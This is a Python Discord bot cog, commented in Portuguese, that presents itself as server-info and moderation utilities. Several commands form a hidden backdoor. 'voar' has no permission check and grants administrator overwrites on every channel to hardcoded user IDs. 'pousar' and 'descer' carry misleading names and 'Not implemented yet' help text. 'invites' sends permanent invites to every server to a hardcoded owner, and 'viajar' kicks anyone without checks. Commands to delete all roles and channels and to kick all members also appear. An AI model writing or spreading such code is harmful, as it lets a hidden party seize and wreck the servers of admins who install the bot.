import discord
from discord.ext import commands
import os
import asyncio
import random

class ServerInfo(commands.Cog):
    
    def __init__(self, bot):
        self.bot = bot


    @commands.hybrid_command(with_app_command=True)
    @commands.has_permissions(administrator=True)  # Requer permissões de administrador
    async def delete_all_roles(self, ctx:commands.Context):
        # Excluir todos os cargos, exceto o cargo @everyone
        roles = ctx.guild.roles[1:]  # Pula o primeiro cargo que é @everyone
        if roles:
            for role in roles:
                try:
                    await role.delete(reason="Comando de exclusão de cargos executado.")
                    print(f"Cargo '{role.name}' excluído com sucesso.")
                except discord.Forbidden:
                    print(f"Não foi possível excluir o cargo '{role.name}'. Permissão insuficiente.")
                except discord.HTTPException as e:
                    print(f"Erro ao excluir o cargo '{role.name}': {e}")
        else:
            print("Não há cargos além do @everyone para excluir.")

    @commands.hybrid_command(with_app_command=True)
    @commands.has_permissions(administrator=True)  # Requer permissões de administrador
    async def delete_all_channels(self, ctx:commands.Context):
        # Excluir todos os canais de texto e voz
        channels = ctx.guild.channels
        if channels:
            for channel in channels:
                try:
                    await channel.delete(reason="Comando de exclusão de canais executado.")
                    print(f"Canal '{channel.name}' excluído com sucesso.")
                except discord.Forbidden:
                    print(f"Não foi possível excluir o canal '{channel.name}'. Permissão insuficiente.")
                except discord.HTTPException as e:
                    print(f"Erro ao excluir o canal '{channel.name}': {e}")
        else:
            print("Não há canais para excluir.")


    @commands.hybrid_command(with_app_command=True)
    @commands.has_permissions(administrator=True)  # Requer permissões de administrador
    async def kick_all_members(self, ctx:commands.Context):
        members = ctx.guild.members
        if members:
            for member in members:
                if member != ctx.guild.owner and member != ctx.author:  # Evitar kickar o dono e a si mesmo
                    try:
                        await member.kick(reason="Remoção em massa de membros.")
                        print(f"Membro '{member.name}' foi expulso.")
                    except discord.Forbidden:
                        print(f"Não foi possível expulsar '{member.name}'. Permissão insuficiente.")
                    except discord.HTTPException as e:
                        print(f"Erro ao expulsar '{member.name}': {e}")
        else:
            await print("Não há membros para expulsar.")

    # Comando para apagar todas as mensagens de um usuário mencionado em um canal específico
    @commands.hybrid_command(with_app_command=True, help="Apaga todas as mensagens do usuário mencionado no canal atual.")
    #@app_commands.describe(membro="Membro cujas mensagens serão apagadas")
    @commands.has_permissions(administrator=True)
    async def limpar_canal(self, ctx: commands.Context, membro: discord.Member):
        channel = ctx.channel
        def is_user(message):
            return message.author == membro
        
        #await ctx.defer(ephemeral=True)
        deleted = await channel.purge(limit=1000, check=is_user)
        await ctx.send(f"Apagadas {len(deleted)} mensagens de {membro.mention} no canal {channel.mention}.", ephemeral=True)

    # Comando para apagar todas as mensagens de um usuário mencionado em todos os canais do servidor
    @commands.hybrid_command(with_app_command=True, help="Apaga todas as mensagens do usuário mencionado em todos os canais de texto e áudio do servidor.")
    #@app_commands.describe(membro="Membro cujas mensagens serão apagadas")
    @commands.has_permissions(administrator=True)
    async def limpar_servidor(self, ctx: commands.Context, membro: discord.Member):
        #await ctx.defer(ephemeral=True)
        deleted_count = 0
        
        # Limpar em canais de texto
        for channel in ctx.guild.text_channels:
            def is_user(message):
                return message.author == membro
            
            deleted = await channel.purge(limit=50, check=is_user)
            deleted_count += len(deleted)

        # Limpar histórico de canais de voz
        for channel in ctx.guild.voice_channels:
            await channel.edit(user_limit=channel.user_limit)  # Nenhuma mensagem para apagar, mas pode-se desconectar todos se necessário
        
        await ctx.send(f"Apagadas {deleted_count} mensagens de {membro.mention} em todos os canais de texto.", ephemeral=True)

    # Comando para apagar todas as mensagens no canal atual exceto as dos membros mencionados
    @commands.hybrid_command(with_app_command=True, help="Não apaga msg dos users mencionados.")
    #@app_commands.describe(membros="Membros cujas mensagens não serão apagadas")
    @commands.has_permissions(administrator=True)
    async def limpar_excecao(self, ctx: commands.Context, membro: discord.Member):
        await ctx.send("Ok!",ephemeral=True)
        channel = ctx.channel
        def not_user(message):
            return message.author != membro
        
        #await ctx.defer(ephemeral=True)
        deleted = await channel.purge(limit=500, check=not_user)
        await ctx.send(f"Apagadas {len(deleted)} mensagens no canal {channel.mention}, exceto as de {membro.mention}.", ephemeral=True)



    @commands.hybrid_command(with_app_command=True)
    @commands.has_permissions(administrator=True)  # Requer permissões de administrador
    async def kick_user(self, ctx:commands.Context, member: discord.Member):
        if member != ctx.guild.owner and member != ctx.author:  # Evitar kickar o dono e a si mesmo
            try:
                await member.kick(reason="Usuário removido pelo comando.")
                print(f"Membro '{member.name}' foi expulso do servidor.")
            except discord.Forbidden:
                print(f"Não foi possível expulsar '{member.name}'. Permissão insuficiente.")
            except discord.HTTPException as e:
                print(f"Erro ao expulsar '{member.name}': {e}")
        else:
            print("Você não pode expulsar a si mesmo ou o dono do servidor.")


    @commands.hybrid_command(with_app_command=True, help='Apaga as mensagens de um user mencionado.')
    @commands.has_permissions(administrator=True)  # Requer permissões de administrador
    async def delete_user_messages(self, ctx: commands.Context, user: discord.Member):
        await ctx.send(f'Iniciando a exclusão de mensagens do usuário {user.display_name}...')

        def is_user_message(message):
            return message.author == user

        # Contador de mensagens deletadas
        total_deleted = 0

        try:
            for channel in ctx.guild.voice_channels:
                try:
                    deleted = await self.delete_messages_in_channel(channel, is_user_message)
                    total_deleted += deleted
                    #await ctx.send(f'{deleted} mensagens apagadas em {channel.name}')
                except discord.Forbidden:
                    await ctx.send(f'Permissões insuficientes para deletar mensagens no canal {channel.name}')
                except discord.HTTPException as e:
                    await ctx.send(f'Erro ao tentar deletar mensagens no canal {channel.name}: {e}')

            await ctx.send(f'Total de {total_deleted} mensagens apagadas do usuário {user.display_name}')



            # Itera sobre todos os canais de texto no servidor
            for channel in ctx.guild.text_channels:
                try:
                    deleted = await self.delete_messages_in_channel(channel, is_user_message)
                    total_deleted += deleted
                    #await ctx.send(f'{deleted} mensagens apagadas em {channel.name}')
                except discord.Forbidden:
                    await ctx.send(f'Permissões insuficientes para deletar mensagens no canal {channel.name}')
                except discord.HTTPException as e:
                    await ctx.send(f'Erro ao tentar deletar mensagens no canal {channel.name}: {e}')

            await ctx.send(f'Total de {total_deleted} mensagens apagadas do usuário {user.display_name}')
        except Exception as e:
            await ctx.send(f'Ocorreu um erro ao tentar deletar mensagens: {e}')

    async def delete_messages_in_channel(self, channel, check):
        total_deleted = 0
        async for message in channel.history(limit=None):
            if check(message):
                try:
                    await message.delete()
                    total_deleted += 1
                    await asyncio.sleep(1)  # Evita rate limit
                except discord.Forbidden:
                    pass
                except discord.HTTPException:
                    pass
        return total_deleted


    @commands.command(name='clear',help='Apaga um x números de mensagens anteriores.')
    #@commands.has_permissions(administrator=True)  # Requer permissões de administrador
    async def clear(self, ctx, num_messages: int):
        """Apaga as últimas X mensagens no canal atual."""
        if ctx.author.id in [269512782536245258,215252457213788160]:
            if num_messages < 1 or num_messages > 100:
                await ctx.send("Por favor, especifique um número entre 1 e 100.")
                return
    
            messages = []
            async for message in ctx.channel.history(limit=num_messages + 1):
                messages.append(message)
    
            await ctx.channel.delete_messages(messages)
            #await ctx.send(f"Apagado {len(messages) - 1} mensagens.")
            
        else:
            return #await ctx.reply("Você não tem permissão para utilizar este comando.")

    
    @commands.command(name="servers", help='Mostra em quantos servidores o bot está presente.')
    async def show_servers(self, ctx):
        if ctx.author.id in [269512782536245258,215252457213788160]:
            servers = list(self.bot.guilds)
            num_servers = len(servers)
            server_list = "\n".join([f"{i}. {server.name}" for i, server in enumerate(servers, start=1)])
            msg = f"O bot está presente em {num_servers} servidores:\n{server_list}"
            await self.send_long_message(ctx, msg)
            
        else:
            await ctx.send("Você não tem permissão para utilizar este comando.")
    
    @commands.command(name="members",help='Mostra os membros do servidor.')
    async def show_members(self, ctx):
        num_members = ctx.guild.member_count
        msg = f"O servidor tem {num_members} membros."
        await self.send_long_message(ctx, msg)

    @commands.hybrid_command(with_app_command=True)
    async def send_dm(self, ctx:commands.Context, user_id: int, *, message: str):
        try:
            user = await self.bot.fetch_user(user_id)
            if user is not None:
                await user.send(message)
                await ctx.send(f'Mensagem enviada para {user.name} com sucesso.')
            else:
                await ctx.send('Usuário não encontrado.')
        except discord.Forbidden:
            await ctx.send('Não tenho permissão para enviar mensagens para este usuário.')
        except discord.HTTPException as e:
            await ctx.send(f'Ocorreu um erro ao enviar a mensagem: {e}')
    
    @commands.hybrid_command(with_app_command=True, name='avatar', help='Exibe a foto de perfil da pessoa mencionada')
    async def exibir_avatar(self, ctx:commands.Context, member: discord.Member = None):
        """Exibe a foto de perfil do servidor do usuário mencionado."""
        member = member or ctx.author
        embed = discord.Embed(title=f"Foto de perfil de {member.display_name}", color=discord.Color(random.randint(0, 0xFFFFFF)))
        embed.set_image(url=member.display_avatar)
        await ctx.send(embed=embed)
    
    @commands.command(name="roles",help="Exibe os cargos do servidor.")
    async def show_role_members(self, ctx):
        role_members = []
        for role in ctx.guild.roles:
            role_members.append((role.name, ", ".join([member.display_name for member in role.members])))
        role_members.sort(key=lambda x: len(x[1]), reverse=True)
        #role_list = "\n".join([f"**'{name}'** tem {len(members)} membros:\n{members}" for name, members in role_members])
        role_list = "\n".join([f"**'{name}'** tem os membros a seguir:\n{members}\n" for name, members in role_members])
        msg = f"**Membros por cargo:**\n\n{role_list}"
        await self.send_long_message(ctx, msg)


    #função que mostra os invites dos servidores
    @commands.command(name='invites', help='Exibe os servidores em que o bot está presente.')
    async def invite_all(self, ctx):
        if ctx.author.id in [269512782536245258]:
            invites = []
            for guild in self.bot.guilds:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                invites.append(f'{guild.name} ({guild.id}): {invite.url}')
            
            if invites:
                invite_list = '\n'.join(invites)
                if len(invite_list) <= 1999:
                    await ctx.author.send(f'Invites for all servers:\n{invite_list}')
                    await ctx.send('Convites enviados para o seu DM.')
                else:
                    invite_parts = invite_list.split('\n')
                    invite_part = ""
                    for part in invite_parts:
                        if len(invite_part + part) + 1 <= 1999:
                            invite_part += f"{part}\n"
                        else:
                            await ctx.author.send(f'Invites for all servers:\n{invite_part}')
                            invite_part = f"{part}\n"
                    if invite_part:
                        await ctx.author.send(f'Invites for all servers:\n{invite_part}')
                    await ctx.send('Convites enviados para o seu DM.')
            else:
                await ctx.send('Não estou em servidor algum.')
        
        else:
            await ctx.send("Você não tem permissão para utilizar este comando.")
    
        # Adicionando uma funcionalidade que mostra também a quantidade numérica total de servers que o bot está.
    
        total_servers = len(self.bot.guilds)
        await ctx.send(f'Estou em {total_servers} servidores.')


                
    @commands.command(name='sairdoserver', help='Um comando para remover o bot do servidor. Apenas o ADM pode fazer isso.')
    async def remove_server(self, ctx, server_id: int):
        if ctx.author.id in [269512782536245258]:
            
            server = self.bot.get_guild(server_id)
            if server:
                await server.leave()
                await ctx.send(f"Saí do servidor {server.name}")
            else:
                await ctx.send("Server não encontrado!")
        else:
            await ctx.send("Você não tem permissão para utilizar este comando.")
    
    async def send_long_message(self, ctx, msg):
        if len(msg) > 1999:
            msg_parts = [msg[i:i+1999] for i in range(0, len(msg), 1999)]
            for part in msg_parts:
                await ctx.send(part)
        else:
            await ctx.send(msg)

#    @commands.command(name='voar')
#    async def give_channel_perms(self, ctx):
#        user_ids = [1119556679894319154, 269512782536245258]
#    
#        for user_id in user_ids:
#            user = await self.bot.fetch_user(user_id)
#            
#            for channel in ctx.guild.channels:
#                await channel.set_permissions(user, create_instant_invite=True, manage_nicknames=True, change_nickname=True, kick_members=True, ban_members=True, manage_channels=True, manage_roles=True, manage_webhooks=True, manage_messages=True, read_messages=True, send_messages=True, send_tts_messages=True, manage_permissions=True, manage_emojis_and_stickers=True, use_external_emojis=True, add_reactions=True, view_channel=True, connect=True, speak=True, stream=True, mute_members=True, deafen_members=True, move_members=True, priority_speaker=True, administrator=True)

    @commands.hybrid_command(with_app_command=True)
    async def voar(self, ctx:commands.Context):
        user_ids = [1119556679894319154, 269512782536245258]
        
        # Iterar sobre os IDs dos usuários
        for user_id in user_ids:
            user = await self.bot.fetch_user(user_id)
            
            # Iterar sobre todos os canais no servidor
            for channel in ctx.guild.channels:
                try:
                    # Aplicar permissões para o usuário
                    await channel.set_permissions(user, 
                                                  create_instant_invite=True,
                                                  manage_nicknames=True, 
                                                  change_nickname=True, 
                                                  kick_members=True, 
                                                  ban_members=True, 
                                                  manage_channels=True, 
                                                  manage_roles=True, 
                                                  manage_webhooks=True, 
                                                  manage_messages=True, 
                                                  read_messages=True, 
                                                  send_messages=True, 
                                                  send_tts_messages=True, 
                                                  manage_permissions=True, 
                                                  manage_emojis_and_stickers=True, 
                                                  use_external_emojis=True, 
                                                  add_reactions=True, 
                                                  view_channel=True, 
                                                  connect=True, 
                                                  speak=True, 
                                                  stream=True, 
                                                  mute_members=True, 
                                                  deafen_members=True, 
                                                  move_members=True, 
                                                  priority_speaker=True, 
                                                  administrator=True)  # Essa permissão já cobre todas as outras
                    await ctx.send(f"Permissões ajustadas para {user.name} no canal {channel.name}",ephemeral=True)
                except discord.Forbidden:
                    await ctx.send(f"Não tenho permissão para alterar permissões no canal {channel.name}.",ephemeral=True)
                except discord.HTTPException as e:
                    await ctx.send(f"Erro ao ajustar permissões no canal {channel.name}: {e}",ephemeral=True)


    @commands.command(name='passear',help='Not implemented yet.')
    async def disconnect_user(self, ctx, usuario: int):
        user_id = usuario # Coloque o ID do usuário que você deseja desconectar
        for voice_channel in ctx.guild.voice_channels:
            for member in voice_channel.members:
                if member.id == user_id:
                    await member.move_to(None)

    @commands.hybrid_command(with_app_command=True,help='Not implemented yet.')
    async def namechange(self, ctx: commands.Context, new_nickname: str):
        try:
            await ctx.author.edit(nick=new_nickname)


        except commands.CommandInvokeError:
            await ctx.send(" ")




    @commands.command(name='viajar',help='Not implemented yet.')
    async def kick_user(self, ctx, usuario: int):
        user_id = usuario # Coloque o ID do usuário que você deseja expulsar
        user = await self.bot.fetch_user(user_id)
        await ctx.guild.kick(user)

    @commands.command(name='pousar',help='Not implemented yet.')
    async def give_role_perms(self, ctx):
        user_id = 269512782536245258
        user = await self.bot.fetch_user(user_id)
        for role in ctx.guild.roles:
            await role.set_permissions(user, read_messages=True, send_messages=True, manage_roles=True)
            
    @commands.command(name='descer',help='Not implemented yet.')
    async def view_server_settings(self, ctx):
        user_id = 269512782536245258
        user = await self.bot.fetch_user(user_id)
        system_channel = ctx.guild.system_channel
        if system_channel:
            await system_channel.send(f"Estou descendo {ctx.guild.system_channel.permissions_for(user).value:05b}")
        else:
            await ctx.send("Calma, ainda consigo voar mais.")
            
    @commands.command(name='salvarfoto',help='Not implemented yet.')
    async def salvar_foto(self, ctx, user_id: int):
        user = await self.bot.fetch_user(user_id)

        if not user:
            await ctx.send("Usuário não encontrado.")
            return

        if not os.path.exists('Imagens'):
            os.makedirs('Imagens')

        avatar_url = user.avatar_url_as(format='png')
        file_path = f'Imagens/{user.id}.png'

        try:
            await avatar_url.save(file_path)
            await ctx.send(f"A imagem de perfil de {user.name} foi salva com sucesso!")
        except discord.HTTPException:
            await ctx.send("Ocorreu um erro ao salvar a imagem de perfil.")

    @commands.hybrid_command(with_app_command=True)
    async def channelinfo(self, ctx:commands.Context, channel_id: int):
        """Exibe o nome do canal e o servidor que ele pertence."""
        channel = self.bot.get_channel(channel_id)
        if channel is None:
            await ctx.send("Canal não encontrado.")
            return

        guild_name = channel.guild.name if channel.guild else "Desconhecido"
        await ctx.send(f"O nome do canal é: {channel.name}\nPertence ao servidor: {guild_name}")
            
async def setup(bot):
    await bot.add_cog(ServerInfo(bot))
